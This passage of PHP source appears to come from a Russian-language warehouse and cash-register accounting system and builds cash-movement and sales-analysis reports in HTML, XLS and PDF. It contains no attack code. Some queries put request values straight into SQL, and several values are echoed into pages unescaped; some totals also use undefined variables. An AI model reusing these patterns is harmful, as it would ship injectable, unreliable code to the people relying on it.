".( !empty( $where2 ) ? ' WHERE '.join( ' AND ', $where2) : '' )." 
GROUP BY r.cashid" );
            
            if ( $row = mysql_fetch_array( $query ) ){
                $ramount = $row['amount'];
            }
            
            $filterContent = '';
            
            if ( $fromRR ){                
                $filterContent = $template['gethtml_cash_remainsdetailed'];
                
                $cashname = '';
            
                $query = mysql_query( "SELECT name AS cashname FROM s_cash AS c WHERE id='".addslashes( $_GET['cash'] )."'" );
            
                if ( $row = mysql_fetch_array( $query ) ) $cashname = $row['cashname'];
                
                $filterContent = str_replace( '{vcashname}', $cashname, $filterContent );
                $filterContent = str_replace( '{vcashid}', $_GET['cash'], $filterContent );
                $filterContent = str_replace( '{dtcheck}', 'checked', $filterContent );
                $filterContent = str_replace( '{dtstart}', ' value="'.date( 'd.m.Y H:i:s', strtotime( $_GET['dt1'] ) ).'"', $filterContent );
                $filterContent = str_replace( '{dtend}', ' value="'.date( 'd.m.Y H:i:s', strtotime( $_GET['dt2'] ) ).'"', $filterContent );
            }
            
            $right = ' text-align: right;';
            $deficitColor = ' color: #F00;';
            
            $output[] = '<span style="font:10px Tahoma;">Время формирования отчета: '.date('d.m.Y H:i:s').'</span>';
            //if ( $showHeaders ) $output[] = '<br /><br />Товар: <b>'.$itemname.'</b><br />Склад: <b>'.$whname.'</b><br /><br />';
            $output[] = '<div class="div_otchet">';
            //$output[] = 'Список документов'.( $showHeaders ? ' за период <b>с '.$period.'</b>' : '' ).':<br />';
            $output[] = 'Список документов:<br />';
            
            $output[] = '<table class="ttda" '.$inxls.'>
<tr class="tableheader">
<td rowspan="2">#</td>
<td rowspan="2">Документ</td>
<td colspan="4">Сумма</td>
</tr>
<tr class="tableheader">
<td>До проведения</td>
<td>Приход</td>
<td>Расход</td>
<td>После проведения</td>
</tr>';
            
            $query = mysql_query( "SELECT
IF(r.documenttype = 1, CONCAT('d_cash_income-', ci.id), 
IF(r.documenttype = 2, CONCAT('d_cash_outcome-', co.id),
IF(r.documenttype = 3, CONCAT('d_cash_movement-', cm .id), ''))) AS id,               

IF(r.documenttype = 1, CONCAT('Поступление в кассу ', ci.id, ' от ', DATE_FORMAT(ci.dt,'%d.%m.%Y %H:%i:%s')),
IF(r.documenttype = 2, CONCAT('Изъятие из кассы ', co.id, ' от ', DATE_FORMAT(co.dt,'%d.%m.%Y %H:%i:%s')), 
IF(r.documenttype = 3, CONCAT('Перемещение между кассами ', cm .id, ' от ', DATE_FORMAT(cm .dt,'%d.%m.%Y %H:%i:%s')), ''))) AS doc,

IF(SUM(r.amount) > 0, SUM(r.amount), 0) AS amountplus,
IF(SUM(r.amount) < 0, (-1) * SUM(r.amount), 0) AS amountminus,
c.name AS cash
FROM r_cash AS r 
LEFT JOIN s_cash AS c ON c.id = r.cashid
LEFT JOIN d_cash_income AS ci ON ci.id = r.documentid AND r.documenttype = 1
LEFT JOIN d_cash_outcome AS co ON co.id = r.documentid AND r.documenttype = 2
LEFT JOIN d_cash_movement AS cm ON cm .id = r.documentid AND r.documenttype = 3
".( !empty( $where2 ) ? ' WHERE '.join( ' AND ', $where2 ) : '' )."
GROUP BY r.cashid, r.documenttype, r.documentid 
ORDER BY cash, r.dt" );
            
            $newramount = $ramount;
            
            $i = 1;
            $sum['amountplus'] = 0;
            $sum['amountminus'] = 0;
            
            $waplus = 0;
            $waminus = 0;
            
            $curcash = '';
            $i = 1;
            while ( $row = mysql_fetch_assoc( $query ) ){
                if ( $curcash != $row['cash']){
                    if ( $i > 1 ){
                        $output[] = '<tr class="tableheader">
<td colspan="3">Итого по складу <b>'.$curwarehouse.'</b></td>
<td style="'.$right.( $waplus < 0 ? $deficitColor : '' ).'"><b>'.round( $waplus, 2 ).'</b></td>
<td style="'.$right.( $waminus < 0 ? $deficitColor : '' ).'"><b>'.round( $waminus, 2 ).'</b></td>
<td></td>
</tr>';
                
                        $waplus = 0;
                        $waminus = 0;
                    }
                    
                    $curcash = $row['cash'];
                    $output[] = '<tr style="background-color: #C5C5C5"><td colspan="10">Склад: <b>'.$curcash.'</b></td></tr>';
                    $i++;
                }
                
                $sum['amountplus'] += $row['amountplus'];
                $sum['amountminus'] += $row['amountminus'];
                
                $waplus += $row['amountplus'];
                $waminus += $row['amountminus'];

                $output[] = '<tr class="doc" id="'.$row['id'].'">
<td style="'.$right.'">'.$i.'</td>
<td>'.$row['doc'].'</td>
<td style="'.$right.( $newramount < 0 ? $deficitColor : '' ).'">'.round( $newramount, 2 ).'</td>
<td style="'.$right.( $row['amountplus'] < 0 ? $deficitColor : '' ).'">'.round( $row['amountplus'], 2 ).'</td>
<td style="'.$right.( $row['amountminus'] < 0 ? $deficitColor : '' ).'">'.round( $row['amountminus'], 2 ).'</td>
<td style="'.$right.( $newramount + $row['amountplus'] - $row['amountminus'] < 0 ? $deficitColor : '' ).'">'.round( $newramount + $row['amountplus'] - $row['amountminus'], 2 ).'</td>
</tr>';
                $i++;
                $newramount = $newramount + $row['amountplus'] - $row['amountminus'];
            }
            
            if ( $i > 1 ){
                $output[] = '<tr class="tableheader">
<td colspan="3">Итого по кассе <b>'.$curcash.'</b></td>
<td style="'.$right.( $waplus < 0 ? $deficitColor : '' ).'"><b>'.round( $waplus, 2 ).'</b></td>
<td style="'.$right.( $waminus < 0 ? $deficitColor : '' ).'"><b>'.round( $waminus, 2 ).'</b></td>
<td></td>
</tr>';
            }
            
            $output[] = '<tr class="tableheader">
<td colspan="2"><b>Итого</b></td>
<td style="'.$right.( $ramount < 0 ? $deficitColor : '' ).'"><b>'.round( $rsum, 2 ).'</b></td>
<td style="'.$right.( $sum['amountplus'] < 0 ? $deficitColor : '' ).'"><b>'.round( $sum['amountplus'], 2 ).'</b></td>
<td style="'.$right.( $sum['amountminus'] < 0 ? $deficitColor : '' ).'"><b>'.round( $sum['amountminus'], 2 ).'</b></td>
<td style="'.$right.( $newramount < 0 ? $deficitColor : '' ).'"><b>'.round( $newramount, 2 ).'</b></td>
</tr>';
             
            $output[] = '</table><br />';
            
            if ( isset( $_GET['print'] ) ){
                switch( $_GET['ftype'] ){
                    case 'xls':  
                        header( "Content-Type: application/download\n" ); 
                        header( "Content-Disposition: attachment; filename=".time().'.xls' );
                        $res = join( "", $output );
                        //переводим в вин-1251
                        echo iconv( "UTF-8", "windows-1251", $res );
                    break;
                    case 'html': 
                        echo '<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Справочники</title>
<script type="text/javascript" src="/company/js/jquery-1.8.0.min.js"></script>
<style>*{font:'.getConfigVal('otchet_font_size').'px Tahoma;margin:0;padding:0} h1{font:bold '.getConfigVal('otchet_h1_size').'px Tahoma} b{font-weight:bold} table{margin: 0; padding: 0; border: 1px solid #000;border-collapse:collapse; width: '.getConfigVal('otchet_width').'px;}
table td{border: 1px dotted #CCCCCC; margin: 0; padding: 3px; border: 1px solid #000;}
.tableheader{background: #F3F3F3;}</style>
<script> $( document ).ready( function (){ window.print(); setTimeout( function (){ window.close(); }, 200 ); }); </script>
</head>
<body>';
                        echo join( "", $output );
                        echo '</body></html>';
                    break;
                    case 'pdf': 
                        require_once( 'pdf/mpdf.php' );
                        $mpdf = new mPDF( 'utf-8', 'A4', '8', '', 2, 2, 1, 1, 2, 2 ); /*задаем формат, отступы и.т.д.*/
                        $mpdf->charset_in = 'utf8'; /*не забываем про русский*/
                        $stylesheet = file_get_contents( 'pdf/mpdf.css' ); /*подключаем css*/
                        $mpdf->WriteHTML( $stylesheet, 1 );
                        $mpdf->list_indent_first_level = 0; 
                        $mpdf->WriteHTML( join( "\n", $output ), 2 ); /*формируем pdf*/
                        $mpdf->Output( 'mpdf.pdf', 'I' );
                     break;
                }
            } else if ( $fromRR ){
                
                $output[] = '<a href="/company/warehouse/warehouse.php?do=remainsdetailed&print=1&ftype=pdf&'.join( '&', $query_string ).'" target="_blank"><img src="/company/i/icon_pdf.png"></a> 
<a href="/company/warehouse/warehouse.php?do=remainsdetailed&print=1&ftype=xls&'.join( '&', $query_string ).'" target="_blank"><img src="/company/i/xls.gif"></a>
<a href="/company/warehouse/warehouse.php?do=remainsdetailed&print=1&ftype=html&'.join( '&', $query_string ).'" target="_blank" class="printota"><img src="/company/i/printer.gif"></a>';
                
                $filterContent = str_replace( '{result}', join( "\n", $output ), $filterContent );
                
                echo $filterContent;
                die( '<script>
$( ".doc" ).die( "click" );
$( ".doc" ).live( "click", function (){
    s = $( this ).attr( "id" );
    pos1 = s.indexOf( "-" );
    table = s.substr( 0, pos1 );
    id = s.substr( pos1 + 1 );
    
    console.log( table + " - " + id );
    
    if ( table == "d_order" ) zview_el( table, id );
    else viewA( table, id );
});
</script>' );
                
            } else echo join( "\n", $output );
             
             echo '</div>';  
             if ( empty( $_GET['print'] ) ){
                echo '<script>
$( ".doc" ).die( "click" );
$( ".doc" ).live( "click", function (){
    s = $( this ).attr( "id" );
    pos1 = s.indexOf( "-" );
    table = s.substr( 0, pos1 );
    id = s.substr( pos1 + 1 );
    
    console.log( table + " - " + id );
    
    if ( table == "d_order" ) zview_el( table, id );
    else viewA( table, id );
});
</script>';                 
                 
                 echo '<a href="/company/warehouse/warehouse.php?do=remainsdetailed&print=1&ftype=pdf&'.join( '&', $query_string ).'" target="_blank"><img src="/company/i/icon_pdf.png"></a> 
<a href="/company/warehouse/warehouse.php?do=remainsdetailed&print=1&ftype=xls&'.join( '&', $query_string ).'" target="_blank"><img src="/company/i/xls.gif"></a>
<a href="/company/warehouse/warehouse.php?do=remainsdetailed&print=1&ftype=html&'.join( '&', $query_string ).'" target="_blank" class="printota"><img src="/company/i/printer.gif"></a>';
             }
//             echo '</div></div></div></div>';  
///////////////////////////////////////
        break;
        
//АНАЛИЗ ПРОДАЖ (не работает)
        case 'salesanalysis':
             $output = array();
             $order = 'id';
             $group = '';
             $inxls = '';
             
             //Принт версия
             if ( isset( $_GET['print'] ) ){
                 $inxls = 'border="1"';
                 if ( isset( $_GET['chb'] ) ) $_POST['chb'] = $_GET['chb'];
                 if ( isset( $_GET['chb_zasmenu'] ) ) $_POST['chb_zasmenu'] = $_GET['chb_zasmenu'];
                 if ( isset( $_GET['chb_zaperiod1'] ) ) $_POST['chb_zaperiod1'] = $_GET['chb_zaperiod1'];
                 if ( isset( $_GET['chb_zaperiod2'] ) ) $_POST['chb_zaperiod2'] = $_GET['chb_zaperiod2'];
                 if ( isset( $_GET['warehouseid'] ) )   $_POST['warehouseid']   = $_GET['warehouseid'];
                 if ( isset( $_GET['documenttype0'] ) )   $_POST['documenttype0']   = $_GET['documenttype0'];
                 if ( isset( $_GET['documenttype1'] ) )   $_POST['documenttype1']   = $_GET['documenttype1'];
                 if ( isset( $_GET['documenttype2'] ) )   $_POST['documenttype2']   = $_GET['documenttype2'];
                 if ( isset( $_GET['documenttype3'] ) )   $_POST['documenttype3']   = $_GET['documenttype3'];
                 if ( isset( $_GET['documenttype4'] ) )   $_POST['documenttype4']   = $_GET['documenttype4'];
                 if ( isset( $_GET['documenttype5'] ) )   $_POST['documenttype5']   = $_GET['documenttype5'];
                 if ( isset( $_GET['documenttype6'] ) )   $_POST['documenttype6']   = $_GET['documenttype6'];
                 if ( isset( $_GET['documenttype7'] ) )   $_POST['documenttype7']   = $_GET['documenttype7'];
             } else {
                 //Формирование ссылки на кнопку "В файл"
                $query_string = array();
                if ( isset( $_POST['chb'] ) ) $query_string[] = 'chb='.$_POST['chb'];
                if ( isset( $_POST['chb_zasmenu'] ) ) $query_string[] = 'chb_zasmenu='.$_POST['chb_zasmenu'];
                if ( isset( $_POST['chb_zaperiod1'] ) ) $query_string[] = 'chb_zaperiod1='.$_POST['chb_zaperiod1'];
                if ( isset( $_POST['chb_zaperiod2'] ) ) $query_string[] = 'chb_zaperiod2='.$_POST['chb_zaperiod2'];
                if ( isset( $_POST['warehouseid'] ) )   $query_string[] = 'warehouseid='.$_POST['warehouseid'];
                
                if ( isset( $_POST['documenttype0'] ) )   $query_string[] = 'documenttype0='.$_POST['documenttype0'];
                if ( isset( $_POST['documenttype1'] ) )   $query_string[] = 'documenttype1='.$_POST['documenttype1'];
                if ( isset( $_POST['documenttype2'] ) )   $query_string[] = 'documenttype2='.$_POST['documenttype2'];
                if ( isset( $_POST['documenttype3'] ) )   $query_string[] = 'documenttype3='.$_POST['documenttype3'];
                if ( isset( $_POST['documenttype4'] ) )   $query_string[] = 'documenttype4='.$_POST['documenttype4'];
                if ( isset( $_POST['documenttype5'] ) )   $query_string[] = 'documenttype5='.$_POST['documenttype5'];
                if ( isset( $_POST['documenttype6'] ) )   $query_string[] = 'documenttype6='.$_POST['documenttype6'];
                if ( isset( $_POST['documenttype7'] ) )   $query_string[] = 'documenttype7='.$_POST['documenttype7'];
            }
            
            $fromFront = isset( $_SESSION['idap'] );

            $right = ' text-align: right;';
            $deficitColor = ' color: #F00;';
            
            $output[]='<span style="font:10px Tahoma;">Время формирования отчета: '.date('d.m.Y H:i:s').'</span>';
            $output[]='<div class="div_otchet">';
            
            $i = 1;
            $title = '';

            //ФИЛЬТРЫ
            $where1 = array();
            $where2 = array();
            $where3 = array();
            if ( $_POST['warehouseid'] > 0 ){
                $where1[] = 'warehouseid="'.addslashes( $_POST['warehouseid'] ).'"';
                $where2[] = 'r.warehouseid="'.addslashes( $_POST['warehouseid'] ).'"';
                $where3[] = 'r.warehouseid="'.addslashes( $_POST['warehouseid'] ).'"';
            }
            
            $wheredoc=array();
            for($i=0;$i<=7;$i++)
                if (isset($_POST['documenttype'.$i])) $wheredoc[]=$i;
            
            if (!empty($wheredoc)){
                 $where2[]='documenttype IN ('.join(',',$wheredoc).')';
            }
            
            switch( $_POST['chb'] ){
                case 'zasmenu':
                    if ( $_POST['chb_zasmenu'] > 0 ){
                        $result = mysql_query( 'SELECT closed, dtopen, dtclosed FROM d_changes WHERE id='.$_POST['chb_zasmenu'] );
                        $row = mysql_fetch_array( $result );
                        
                        $where1[] = 'dt<="'.date( 'Y-m-d H:i:s', strtotime( $row['dtopen'] ) ).'"';
                        $_POST['chb_zaperiod1'] = date( 'Y-m-d H:i:s', strtotime( $row['dtopen'] ) );
                        
                        if ( $row['closed'] == 0 ){
                            $where2[] = 'r.dt>"'.date( 'Y-m-d H:i:s', strtotime( $row['dtopen'] ) ).'" AND r.dt<="'.date( 'Y-m-d H:i:s', time() ).'"';
                            $where3[] = 'r.dt<="'.date( 'Y-m-d H:i:s', time() ).'"';
                            $_POST['chb_zaperiod2'] = date( 'Y-m-d H:i:s', time() );
                        } else {
                            $where2[] = 'r.dt>"'.date( 'Y-m-d H:i:s', strtotime( $row['dtopen'] ) ).'" AND r.dt<="'.date( 'Y-m-d H:i:s', strtotime( $row['dtclosed'] ) ).'"';
                            $where3[] = 'r.dt<="'.date( 'Y-m-d H:i:s', strtotime( $row['dtclosed'] ) ).'"';
                            $_POST['chb_zaperiod2'] = date( 'Y-m-d H:i:s', strtotime( $row['dtclosed'] ) );
                        }
                        $title = 'За смену: '.$row['dtopen'].'_'.$row['dtclosed'];
                    }
                break;
                case 'zaperiod':
                    if ( ( $_POST['chb_zaperiod1'] != '' ) && ( $_POST['chb_zaperiod2'] != '' ) ){
                        $where1[] = 'dt<="'.date( 'Y-m-d H:i:s', strtotime( $_POST['chb_zaperiod1'] ) ).'"';
                        $where2[] = 'r.dt>"'.date( 'Y-m-d H:i:s', strtotime( $_POST['chb_zaperiod1'] ) ).'" AND r.dt<="'.date( 'Y-m-d H:i:s', strtotime( $_POST['chb_zaperiod2'] ) ).'"';
                        $where3[] = 'r.dt<="'.date( 'Y-m-d H:i:s', strtotime( $_POST['chb_zaperiod2'] ) ).'"';
                        $title='За период: с '.$_POST['chb_zaperiod1'].' по '.$_POST['chb_zaperiod2'];
                    }
                break;
            }

            $output[] = $title.'<br />';
            $output[]='<div><table class="ttda" '.$inxls.'>
<tr class="tableheader">
<td rowspan="2">#</td>
<td rowspan="2">Товар</td>
<td rowspan="2">Характеристика</td>
<td rowspan="2">Ед. изм.</td>
<td '.( $fromFront ? '' : 'colspan="2"' ).'>Приход</td>
<td '.( $fromFront ? '' : 'colspan="2"' ).'>Расход</td>
</tr>
<tr class="tableheader">
<td>Кол-во</td>
'.( $fromFront ? '' : '<td>Сумма</td>' ).'
<td>Кол-во</td>
'.( $fromFront ? '' : '<td>Сумма</td>' ).'
</tr>';

            $query = mysql_query( 
"SELECT
 w.name AS warehouse, i.name AS item, s.name AS specification,
 ABS(IFNULL(income.quantity, 0)) AS quantityplus,
 ABS(IFNULL(income.rsum, 0)) AS plussum, ABS(IFNULL(income.rsum / income.quantity, 0)) AS costprice,
 ABS(SUM(r.quantity)) AS quantityminus,
 ABS(SUM(r.costsum)) AS minussum, ABS(SUM(r.salesum) / SUM(r.quantity)) AS saleprice,
 r.itemid,
 r.warehouseid,
 r.specificationid 
FROM r_remainder AS r 
LEFT JOIN (
 SELECT warehouseid, itemid, specificationid, SUM(quantity) AS quantity,
  SUM(costsum) AS rsum, SUM(costsum) / SUM(quantity) AS costprice
 FROM r_remainder AS r 
 ".( !empty( $where2 ) ? ' WHERE '.join( ' AND ', $where2) : '' )." AND quantity>0
 GROUP BY warehouseid, itemid, specificationid 
) AS income ON income.itemid=r.itemid AND income.specificationid=r.specificationid AND income.warehouseid=r.warehouseid
LEFT JOIN s_items AS i ON i.id=r.itemid
LEFT JOIN s_specifications AS s ON s.id=r.specificationid
LEFT JOIN s_warehouse AS w ON w.id=r.warehouseid
".( !empty( $where2 ) ? ' WHERE '.join( ' AND ', $where2) : '' )." AND r.quantity<0
GROUP BY r.warehouseid, r.itemid, r.specificationid 
ORDER BY warehouse, item, specification" );


            
            $i = 1;
            $sum['rsum'] = 0;
            $sum['plussum'] = 0;
            $sum['minussum'] = 0;
            $sum['newrsum'] = 0;
            $cursum['rsum'] = 0;
            $cursum['plussum'] = 0;
            $cursum['minussum'] = 0;
            $cursum['newrsum'] = 0;
            $curwarehouse = '';
            while ( $row = mysql_fetch_assoc( $query ) ){
                if ( $curwarehouse != $row['warehouse']){
                    if ( !$fromFront && $i > 1 ){
                        $output[] = '<tr style="background-color: #C5C5C5">
<td colspan="5">Итого по складу <b>'.$curwarehouse.'</b></td>
<td style="'.$right.( $cursum['plussum'] < 0 ? $deficitColor : '' ).'"><b>'.round( $cursum['rcostsum'], 2 ).'</b></td>
<td></td>
<td style="'.$right.( $cursum['minussum'] < 0 ? $deficitColor : '' ).'"><b>'.round( $cursum['rsalesum'], 2 ).'</b></td>
</tr>';
                        
                        $sum['rsum'] += $cursum['rsum'];
                        $sum['plussum'] += $cursum['rcostsum'];
                        $sum['minussum'] += $cursum['rsalesum'];
                        $sum['newrsum'] += $cursum['newrsum'];
                        $cursum['rsum'] = 0;
                        $cursum['plussum'] = 0;
                        $cursum['minussum'] = 0;
                        $cursum['newrsum'] = 0;
                    }
                    
                    $curwarehouse = $row['warehouse'];
                    $output[] = '<tr style="background-color: #C5C5C5"><td colspan="12">Склад: <b>'.$row['warehouse'].'</b></td></tr>';
                }
                $cursum['rsum'] += $row['rsum'];
                $cursum['plussum'] += $row['plussum'];
                $cursum['minussum'] += $row['minussum'];
                $cursum['newrsum'] += $row['newrsum'];

                $output[] = '<tr id="'.$row['itemid'].'_'.$row['warehouseid'].'_'.$row['specificationid'].'" class="itemremains">
<td>'.$i.'</td>
<td>'.$row['item'].'</td>
<td>'.$row['specification'].'</td>
<td>'.$row['measure'].'</td>
<td style="'.$right.( $row['quantityplus'] < 0 ? $deficitColor : '' ).'">'.round( $row['quantityplus'], 3 ).'</td>
'.( $fromFront ? '' : '<td style="'.$right.( $row['plussum'] < 0 ? $deficitColor : '' ).'">'.round( $row['plussum'], 2 ).'</td>').'
<td style="'.$right.( $row['quantityminus'] < 0 ? $deficitColor : '' ).'">'.round( $row['quantityminus'], 3 ).'</td>
'.( $fromFront ? '' : '<td style="'.$right.( $row['minussum'] < 0 ? $deficitColor : '' ).'">'.round( $row['minussum'], 2 ).'</td>').'
</tr>';
                $i++;
            }
            
            if ( !$fromFront ){
                $output[] = '<tr style="background-color: #C5C5C5">
<td colspan="5">Итого по складу <b>'.$curwarehouse.'</b></td>
<td style="'.$right.( $cursum['plussum'] < 0 ? $deficitColor : '' ).'"><b>'.round( $cursum['plussum'], 2 ).'</b></td>
<td></td>
<td style="'.$right.( $cursum['minussum'] < 0 ? $deficitColor : '' ).'"><b>'.round( $cursum['minussum'], 2 ).'</b></td>
</tr>';
                        
            $sum['rsum'] += $cursum['rsum'];
            $sum['plussum'] += $cursum['plussum'];
            $sum['minussum'] += $cursum['minussum'];
            $sum['newrsum'] += $cursum['newrsum'];
            
            $output[] = '<tr class="tableheader">
<td colspan="5"><b>Итого</b></td>
<td style="'.$right.( $sum['plussum'] < 0 ? $deficitColor : '' ).'"><b>'.round( $sum['plussum'], 2 ).'</b></td>
<td></td>
<td style="'.$right.( $sum['minussum'] < 0 ? $deficitColor : '' ).'"><b>'.round( $sum['minussum'], 2 ).'</b></td>
</tr>';
            }
             
            $output[] = '</table></div><br />';
            $output[] = '</div>';
            
            if ( isset( $_GET['print'] ) ){
                switch( $_GET['ftype'] ){
                    case 'xls':  
                        header( "Content-Type: application/download\n" ); 
                        header( "Content-Disposition: attachment; filename=".time().'.xls' );
                        $res = join( "", $output );
                        //переводим в вин-1251
                        echo iconv( "UTF-8", "windows-1251", $res );
                    break;
                    case 'html': 
                        echo '<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Paloma365 Анализ продаж</title>
<script type="text/javascript" src="/company/js/jquery-1.8.0.min.js"></script>
<style>*{font:'.getConfigVal('otchet_font_size').'px Tahoma;margin:0;padding:0} h1{font:bold '.getConfigVal('otchet_h1_size').'px Tahoma} b{font-weight:bold} table{margin: 0; padding: 0; border: 1px solid #000;border-collapse:collapse; width: '.getConfigVal('otchet_width').'px;}
table td{border: 1px dotted #CCCCCC; margin: 0; padding: 3px; border: 1px solid #000;}
.tableheader{background: #F3F3F3;}</style>
<script> $( document ).ready( function (){ window.print(); setTimeout( function (){ window.close(); }, 200 ); }); </script>
</head>
<body>';
                        echo join( "", $output );
                        echo '</body></html>';
                    break;
                    case 'pdf': 
                        require_once( 'pdf/mpdf.php' );
                        $mpdf = new mPDF( 'utf-8', 'A4', '8', '', 2, 2, 1, 1, 2, 2 ); /*задаем формат, отступы и.т.д.*/
                        $mpdf->charset_in = 'utf8'; /*не забываем про русский*/
                        $stylesheet = file_get_contents( 'pdf/mpdf.css' ); /*подключаем css*/
                        $mpdf->WriteHTML( $stylesheet, 1 );
                        $mpdf->list_indent_first_level = 0; 
                        $mpdf->WriteHTML( join( "\n", $output ), 2 ); /*формируем pdf*/
                        $mpdf->Output( 'mpdf.pdf', 'I' );
                     break;
                }
             } else echo join( "\n", $output );
                 
             echo '<a href="/company/warehouse/warehouse.php?do=remains&print=1&ftype=pdf&'.join( '&', $query_string ).'" target="_blank"><img src="/company/i/icon_pdf.png"></a> 
<a href="/company/warehouse/warehouse.php?do=remains&print=1&ftype=xls&'.join( '&', $query_string ).'" target="_blank"><img src="/company/i/xls.gif"></a>
<a href="/company/warehouse/warehouse.php?do=remains&print=1&ftype=html&'.join( '&', $query_string ).'" target="_blank" class="printota"><img src="/company/i/printer.gif"></a>';
echo '<script>
$( ".itemremains" ).die( "click" );
$( ".itemremains" ).live( "click", function (){
    s = $( this ).attr( "id" );
    pos1 = s.indexOf( "_" );
    itemid = s.substr( 0, pos1 );
    s = s.substr( pos1 + 1 );
    pos1 = s.indexOf( "_" );
    warehouseid = s.substr( 0, pos1 );
    specificationid = s.substr( pos1 + 1 );
    title = "Движения товаров";
    otchet = "gethtml_remainsdetailed";
    console.log(warehouseid + " - " + itemid + " - " + specificationid);
    $.ajax({ 
        type: "POST",
        url: "/company/warehouse/warehouse.php?do=remainsdetailed&item="+itemid+"&warehouse="+warehouseid+"&specification="+specificationid+"&dt1='.date( 'Y-m-d H:i:s', strtotime( $_POST['chb_zaperiod1'] ) ).'&dt2='.date( 'Y-m-d H:i:s',strtotime( $_POST['chb_zaperiod2'] ) ).'"
    }).success( function ( form ){
        removeTabIfExist( \'#tab_\' + otchet );
        cont = \'<div class="bggrey"><h4>\' + title + \'</h4></div><div class="righttd-content">\' + form + \'</div>\';     
        addTab( title, otchet, cont ); 
        $( \'.righttd-content\' ).height( $( \'.righttd\' ).height() - 144 );
    });
});
</script>';
        break;
////АНАЛИЗ ПРОДАЖ 

 
//АНАЛИЗ ПРОДАЖ  
 case 'salesanalysis2':
             $output = array();
             $order = 'id';
             $group = '';
             $inxls = '';
             
             //Принт версия
             if ( isset( $_GET['print'] ) ){
                 $inxls = 'border="1"';
                 if ( isset( $_GET['chb'] ) ) $_POST['chb'] = $_GET['chb'];
                 if ( isset( $_GET['chb_zasmenu'] ) ) $_POST['chb_zasmenu'] = $_GET['chb_zasmenu'];
                 if ( isset( $_GET['chb_zaperiod1'] ) ) $_POST['chb_zaperiod1'] = $_GET['chb_zaperiod1'];
                 if ( isset( $_GET['chb_zaperiod2'] ) ) $_POST['chb_zaperiod2'] = $_GET['chb_zaperiod2'];
                 if ( isset( $_GET['warehouseid'] ) )   $_POST['warehouseid']   = $_GET['warehouseid'];
             } else {
                 //Формирование ссылки на кнопку "В файл"
                $query_string = array();
                if ( isset( $_POST['chb'] ) ) $query_string[] = 'chb='.$_POST['chb'];
                if ( isset( $_POST['chb_zasmenu'] ) ) $query_string[] = 'chb_zasmenu='.$_POST['chb_zasmenu'];
                if ( isset( $_POST['chb_zaperiod1'] ) ) $query_string[] = 'chb_zaperiod1='.$_POST['chb_zaperiod1'];
                if ( isset( $_POST['chb_zaperiod2'] ) ) $query_string[] = 'chb_zaperiod2='.$_POST['chb_zaperiod2'];
                if ( isset( $_POST['warehouseid'] ) )   $query_string[] = 'warehouseid='.$_POST['warehouseid'];
                
            }
            
            $fromFront = isset( $_SESSION['idap'] );

            $right = ' text-align: right;';
            $deficitColor = ' color: #F00;';
            
            $output[]='<span style="font:10px Tahoma;">Время формирования отчета: '.date('d.m.Y H:i:s').'</span>';
            $output[]='<div class="div_otchet">';
            
            $i = 1;
            $title = '';

            //ФИЛЬТРЫ
            $where1 = array();
            $where2 = array();
            $where3 = array();
            if ( $_POST['warehouseid'] > 0 ){
                $where1[] = 'warehouseid="'.addslashes( $_POST['warehouseid'] ).'"';
                $where2[] = 'r.warehouseid="'.addslashes( $_POST['warehouseid'] ).'"';
                $where3[] = 'r.warehouseid="'.addslashes( $_POST['warehouseid'] ).'"';
            }
            
            $wheredoc=array();
            
            switch( $_POST['chb'] ){
                case 'zasmenu':
                    if ( $_POST['chb_zasmenu'] > 0 ){
                        $result = mysql_query( 'SELECT closed, dtopen, dtclosed FROM d_changes WHERE id='.$_POST['chb_zasmenu'] );
                        $row = mysql_fetch_array( $result );
                        
                        $where1[] = 'dt<="'.date( 'Y-m-d H:i:s', strtotime( $row['dtopen'] ) ).'"';
                        $_POST['chb_zaperiod1'] = date( 'Y-m-d H:i:s', strtotime( $row['dtopen'] ) );
                        
                        if ( $row['closed'] == 0 ){
                            $where2[] = 'r.dt>"'.date( 'Y-m-d H:i:s', strtotime( $row['dtopen'] ) ).'" AND r.dt<="'.date( 'Y-m-d H:i:s', time() ).'"';
                            $where3[] = 'r.dt<="'.date( 'Y-m-d H:i:s', time() ).'"';
                            $_POST['chb_zaperiod2'] = date( 'Y-m-d H:i:s', time() );
                        } else {
                            $where2[] = 'r.dt>"'.date( 'Y-m-d H:i:s', strtotime( $row['dtopen'] ) ).'" AND r.dt<="'.date( 'Y-m-d H:i:s', strtotime( $row['dtclosed'] ) ).'"';
                            $where3[] = 'r.dt<="'.date( 'Y-m-d H:i:s', strtotime( $row['dtclosed'] ) ).'"';
                            $_POST['chb_zaperiod2'] = date( 'Y-m-d H:i:s', strtotime( $row['dtclosed'] ) );
                        }
                        $title = 'За смену: '.$row['dtopen'].'_'.$row['dtclosed'];
                    }
                break;
                case 'zaperiod':
                    if ( ( $_POST['chb_zaperiod1'] != '' ) && ( $_POST['chb_zaperiod2'] != '' ) ){
                        $where1[] = 'dt<="'.date( 'Y-m-d H:i:s', strtotime( $_POST['chb_zaperiod1'] ) ).'"';
                        $where2[] = 'r.dt>"'.date( 'Y-m-d H:i:s', strtotime( $_POST['chb_zaperiod1'] ) ).'" AND r.dt<="'.date( 'Y-m-d H:i:s', strtotime( $_POST['chb_zaperiod2'] ) ).'"';
                        $where3[] = 'r.dt<="'.date( 'Y-m-d H:i:s', strtotime( $_POST['chb_zaperiod2'] ) ).'"';
                        $title='За период: с '.$_POST['chb_zaperiod1'].' по '.$_POST['chb_zaperiod2'];
                    }
                break;
            }

            $output[] = $title.'<br />';
            $output[]='<div><table class="ttda" '.$inxls.'>
<tr class="tableheader">
<td rowspan="2">#</td>
<td rowspan="2">Товар</td>
<td rowspan="2">Характеристика</td>
<td rowspan="2">Ед. изм.</td>
<td colspan="2">Списание</td>
<td colspan="3">Продажи</td>
<td colspan="2">Профит</td>
</tr>
<tr class="tableheader">
<td>Кол-во</td>
<td>Сумма</td>
<td>Кол-во</td>
<td>Себест</td>
<td>Доход</td>
<td>Сумма</td>
<td>%</td>
</tr>';

    $query_string1="SELECT
 w.name AS warehouse, 
 i.name AS item, 
 s.name AS specification,
 ABS(IFNULL(outcome.quantity, 0)) AS quantityminus,
 ABS(IFNULL(outcome.rsum, 0)) AS minussum, 
 ABS(IFNULL(income.rsum / income.quantity, 0)) AS costprice,
 ABS(SUM(sales.quantity)) AS quantityplus,
 ABS(sales.rsum) AS plussum, 
 ABS(sales.rsum / sales.costprice) AS saleprice,
 r.itemid,
 r.warehouseid,
 r.specificationid 
FROM r_remainder AS r 
LEFT JOIN (
 SELECT warehouseid, itemid, specificationid, SUM(quantity) AS quantity,
